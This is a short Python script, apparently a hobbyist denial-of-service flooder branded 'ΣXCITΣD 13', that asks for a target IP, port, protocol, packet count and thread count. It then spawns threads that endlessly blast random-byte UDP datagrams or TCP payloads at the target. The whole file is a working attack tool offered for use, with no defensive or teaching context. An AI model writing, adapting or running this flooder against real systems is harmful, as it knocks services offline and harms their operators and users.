#!/usr/bin/env python3
#AmpunBang
#RenameGuaTembakPalalu
import random
import socket
import threading
import os
import sys

os.system("clear")

print("""\033[1;31;40m




█████████████████████████████████████████
█▄─▄▄─█▄─▀─▄█─▄▄▄─█▄─▄█─▄─▄─█▄─▄▄─█▄─▄▄▀█
██─▄█▀██▀─▀██─███▀██─████─████─▄█▀██─██─█
▀▄▄▄▄▄▀▄▄█▄▄▀▄▄▄▄▄▀▄▄▄▀▀▄▄▄▀▀▄▄▄▄▄▀▄▄▄▄▀▀ """)


print("========= ΣXCITΣD 13 =========")
print("=== AUTHOR BY : ΣXCITΣD 13 ====")
print("===========  V1.0  ===========")

ip = str(input(" IP :"))
port = int(input(" Port :"))
choice = str(input(" UDP ? (y / n):"))
times = int(input(" Packet : "))
threads = int(input(" Threads :"))

def run():
  data = random._urandom(65534)
  i = random.choice(("[+]","[!]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
      print(i +"ΣXCITΣD Attack")
    except:
      print(" DOWN!!")

def run2():
  data = random._urandom(818)
  i = random.choice(("[+]","[!]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
      print(i +" ΣXCITΣD!!!")
    except:
      s.close()
      print("[*] Error")

for y in range(threads):
  if choice == 'y':
    th = threading.Thread(target = run)
    th.start()
  else:
    th = threading.Thread(target = run2)
    th.start()